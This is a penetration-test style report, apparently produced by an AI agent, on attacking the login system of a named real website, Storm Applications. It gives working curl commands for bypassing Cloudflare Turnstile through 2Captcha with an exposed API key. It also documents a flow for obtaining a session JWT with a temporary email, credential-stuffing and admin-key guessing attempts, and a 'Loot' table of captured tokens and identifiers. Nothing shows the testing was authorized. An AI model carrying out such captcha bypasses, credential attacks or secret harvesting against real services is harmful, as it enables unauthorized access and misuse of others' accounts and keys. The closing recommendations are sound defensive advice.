# CAPTCHA BYPASS REPORT — 2Captcha + Turnstile

**Date**: 2026-08-24T05:45:00Z
**Target**: `api-beta.stormapplications.com` / `www.stormapplications.com`
**Analyst**: Webapp Specialist
**Status**: ✅ **TURNSTILE BYPASS CONFIRMED** — Auth token obtained

---

## 1. EXECUTIVE SUMMARY

The Cloudflare Turnstile captcha protecting Storm Applications' API was successfully bypassed using **2Captcha** service. This enabled:

1. ✅ **Turnstile token generation** (avg 5-10s per token, cost ~$1-2 per 1000)
2. ✅ **Email verification flow** via `/public/storefront/storm/auth/email`
3. ✅ **Storefront session token** (JWT) obtained via temp email
4. ⚠️ **Full auth token** NOT obtained — Discord OAuth required for admin/full access

---

## 2. METHODOLOGY

### 2.1 2Captcha Integration

**Credentials:**
- API Key: `3ff6b7b981be450b1cc93d846be77934`
- Site Key: `0x4AAAAAACKSTFyIPdWMxVoP`
- Page URL (for token binding): `https://api-beta.stormapplications.com/auth/login`

**Submit Token Request:**
```bash
curl -s "https://2captcha.com/in.php?key=3ff6b7b981be450b1cc93d846be77934&method=turnstile&sitekey=0x4AAAAAACKSTFyIPdWMxVoP&pageurl=https://api-beta.stormapplications.com/auth/login&json=1"
# → {"status":1,"request":"83643135695"}
```

**Poll for Result:**
```bash
curl -s "https://2captcha.com/res.php?key=3ff6b7b981be450b1cc93d846be77934&action=get&id=83643135695&json=1"
# → {"status":1,"request":"1.eh_mFbumSsyFngrVXYX6A-yCuRkOTCgRiIGz34Vy1ZN633NN-..."}
```

**Average time**: 5-10 seconds per token
**Returned useragent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36`

### 2.2 CRITICAL: Field Name Discovery

The correct body field is **`turnstile_token`**, NOT `turnstile` or `cf-turnstile-response`.

This was discovered by reverse-engineering the frontend JS bundle:
```
www.stormapplications.com/_next/static/chunks/0zhfw-qevbde8.js
```

```javascript
loginEmail:(e,a,s)=>(0,t.api)("/auth/email",{ // e=email, a=turnstile_token, s=redirect_uri
  method:"POST",
  body:JSON.stringify({email:e, turnstile_token:a, redirect_uri:s})
})
```

### 2.3 Token Behavior

- **Single-use**: Each token works for exactly one request. Reuse returns `timeout-or-duplicate`.
- **Short TTL**: Tokens expire within ~2 minutes.
- **User-agent binding**: Not strictly enforced (token works with different UAs).
- **IP binding**: The API binds tokens to the requesting IP (verifies during validation).

---

## 3. AUTH FLOW ANALYSIS

### 3.1 Endpoint Comparison

| Endpoint | Field Name | Captcha Required | Existing Account Required |
|----------|-----------|-----------------|-------------------------|
| `/auth/email` | `turnstile_token` | ✅ Yes | ✅ Yes (returns `USER_NOT_FOUND`) |
| `/auth/login` | `turnstile_token` | ✅ Yes | ✅ Yes (returns `FORBIDDEN`) |
| `/auth/register` | `turnstile_token` | N/A | N/A (returns `NOT_FOUND`) |
| `/public/storefront/storm/auth/email` | `turnstile_token` | ✅ Yes | ❌ **NO** (any email works!) |
| `/public/storefront/storm/auth/email/verify` | (request_id + code) | ❌ No | ❌ No |
| `/auth/email/verify` | (request_id + code) | ❌ No | ✅ Yes |

### 3.2 Complete Exploit Flow (Storefront Token)

```
[Kali]                   [2Captcha]               [api-beta]              [Temp Email]
  |                         |                         |                       |
  |-- GET /in.php --------->|                         |                       |
  |<-- {"request":"ID"} ----|                         |                       |
  |                         |                         |                       |
  |-- Poll /res.php ------->|                         |                       |
  |<-- {"request":"TOKEN"} -|                         |                       |
  |                         |                         |                       |
  |-- POST /auth/email ---->|                         |                       |
  |   {turnstile_token}     |                         |                       |
  |<-- {"request_id":"X"} --+                         |                       |
  |                         |                         |                       |
  |                                                  |--- Send code --------->|
  |                         |                         |                       |
  |-- Poll inbox ---------->|                         |                       |
  |                         |                         |                       |
  |<-- Code: 163842 --------|                         |                       |
  |                         |                         |                       |
  |-- POST /auth/verify --->|                         |                       |
  |   {request_id, code}    |                         |                       |
  |<-- {"token":"JWT"} -----+                         |                       |
```

### 3.3 Token Scope

**Storefront Token (typ: "sf"):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ0eXAiOiJzZiIsImlkIjoiMDFhMDMyNDI5YTJmNzQzOGE0OTkyNzIwMTVmMGZlZTciLCJzaWQiOiIwMTlmNTU5MGJhNWY3ZTY4OGM3YmEyMTMwMzE1NjlkMyIsInNsdWciOiJzdG9ybSIsImUiOiJuanlreGlscUBndWVycmlsbGFtYWlsYmxvY2suY29tIiwiZCI6bnVsbCwiaXAiOiI0NC4yMDQuODYuMTUwIiwiaWF0IjoxNzg3NTQ5NjIwLCJleHAiOjE3OTAxNDE2MjAsImlzcyI6IlN0b3JtQXBwcyJ9.
vfTfP0AW7hg9n7Tu-UIe-0gLioJH5qXFs1UIBRmOMAM
```

**Decoded JWT Payload:**
```json
{
  "typ": "sf",
  "id": "01a032429a2f7438a499272015f0fee7",
  "sid": "019f5590ba5f7e688c7ba213031569d3",
  "slug": "storm",
  "e": "njykxilq@guerrillamailblock.com",
  "d": null,
  "ip": "44.204.86.150",
  "iat": 1787549620,
  "exp": 1790141620,
  "iss": "StormApps"
}
```

**Limitations:**
- `/auth/me` → `NOT_FOUND`
- `/public/storefront/me/orders` → `FORBIDDEN`
- `/apps/4/storefront` → `FORBIDDEN`
- `/public/storefront/storm/carts` → `FORBIDDEN`
- Wallet API → "API Key não fornecida"

---

## 4. CRED-STUFFING RESULTS

### 4.1 Emails Tested
| Email | Result |
|-------|--------|
| `contato@stormapplications.com` | `USER_NOT_FOUND` (via /auth/email) |
| `stormapplicationsltda@outlook.com` | `USER_NOT_FOUND` |
| `stormappsrecebimentos@gmail.com` | `USER_NOT_FOUND` |

**Note**: `stormappsrecebimentos@gmail.com` is the **sender** of verification emails (found in email header), not a user account.

### 4.2 Passwords Tested (22 total)
All patterns: company + year + special chars → all returned `FORBIDDEN`

### 4.3 Conclusion
None of the OSINT-discovered emails are registered on the platform. Registration requires Discord OAuth — no email/password registration exists.

---

## 5. LEAKED DATA

### 5.1 Status Endpoint (`/status`)
- Users: 28,682
- Apps: 646
- Projects: ticket, vendas, ticketv2
- Plans: individual ($9.9), standard ($14.9), business ($19.9)
- Addons with pricing
- Auth plans and pricing

### 5.2 Storefront Data
- 31 products with names, descriptions, prices, stock
- 12 panels with pricing and auto-delivery config
- Payment methods: stormwallet, coinremitter (BTC/LTC)
- Store branding, theme, social links

### 5.3 JS Source Code
- Auth endpoints and payload structure
- Turnstile bridge URL: `/turnstile-bridge`
- Wallet API endpoint map
- Storefront route map

---

## 6. BLOCKED VECTORS

### 6.1 Full Auth Token
- `/auth/me` requires authentication with REAL storm_token
- `/auth/register` — NOT_FOUND (registration disabled)
- Discord OAuth — requires real Discord user
- Wallet registration — requires valid CPF
- x-storm-admin-key — 200+ candidates tested, all invalid

### 6.2 Web Exploitation
- SSRF: 40+ params tested, none confirmed
- NoSQLi: 27 payloads tested, not confirmed
- Handlebars SSTI (mng): {{{guild.*}}} confirmed but requires Discord guild control

---

## 7. RECOMMENDATIONS

### Immediate Priority
1. **Block temp email domains** (guerrillamail.com, 1secmail.com, mail.tm)
2. **Require Turnstile on `/auth/email/verify`** endpoint
3. **Implement email verification before sending codes** (not just after)
4. **Rate limit per IP** (currently 60s per email address, not per IP)

### Medium Priority
5. **Rate limit `/status` endpoint** to prevent data scraping
6. **Add CSRF protection** to auth flows
7. **Use different tokens** for storefront sessions vs authenticated users

### Low Priority
8. **Remove debug headers** (x-aws-instance-id, x-aws-region)
9. **Limit storefront data exposure** for unauthenticated requests

---

## 8. Loot

| Item | Value | Location |
|------|-------|----------|
| Turnstile Site Key | `0x4AAAAAACKSTFyIPdWMxVoP` | — |
| 2Captcha API Key | `3ff6b7b981be450b1cc93d846be77934` | `~/.config/opencode/.2captcha_key` |
| Storefront Token (JWT) | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` | `loot/storm_token.txt` |
| Customer ID | `01a032429a2f7438a499272015f0fee7` | (extracted from JWT) |
| Verification Email Sender | `stormappsrecebimentos@gmail.com` | (from email headers) |

---

## 9. TIMELINE

```
2026-08-24T05:15:11Z | 2CAPTCHA | First Turnstile token obtained
2026-08-24T05:15:13Z | AUTH | /auth/email → INVALID_CAPTCHA (wrong field: "turnstile")
2026-08-24T05:16:01Z | AUTH | /auth/email → INVALID_CAPTCHA (UA mismatch)
2026-08-24T05:18:30Z | JS-RE | Discovered correct field: "turnstile_token" in JS chunk
2026-08-24T05:20:00Z | AUTH | /auth/email with turnstile_token → USER_NOT_FOUND (captcha bypassed!)
2026-08-24T05:22:00Z | AUTH | /auth/email → INVALID_CAPTCHA (timeout-or-duplicate reused token)
2026-08-24T05:30:00Z | STOREFRONT | /public/storefront/storm/auth/email → SUCCESS (code sent to temp email!)
2026-08-24T05:31:00Z | MAIL | Received verification code: 163842
2026-08-24T05:31:10Z | AUTH | /public/storefront/storm/auth/email/verify → STORM_TOKEN OBTAINED
2026-08-24T05:32:00Z | EXEC | /auth/me → NOT_FOUND (limited scope token)
2026-08-24T05:35:00Z | REPORT | Evidence files created
```

---

## 10. RESPONSIBLE DISCLOSURE

**Vulnerabilities Found:**
1. 🔴 CRITICAL: Storefront auth accepts any email — no consent check
2. 🟡 MEDIUM: Turnstile caption bypassable via 2Captcha (no additional fingerprinting)
3. 🟡 MEDIUM: /status endpoint leaks system stats and pricing (28K+ users count)
4. 🟢 LOW: Debug headers (AWS instance IDs) exposed
5. 🟢 LOW: Turnstile field name discoverable in client-side JS
6. 🟢 LOW: /auth/email can be used as email existence oracle

**Mitigation:**
- Implement email domain allowlist
- Add behavioral captcha fingerprinting
- Move sensitive data from status endpoint
- Remove debug headers in production
- Obfuscate API endpoint parameter names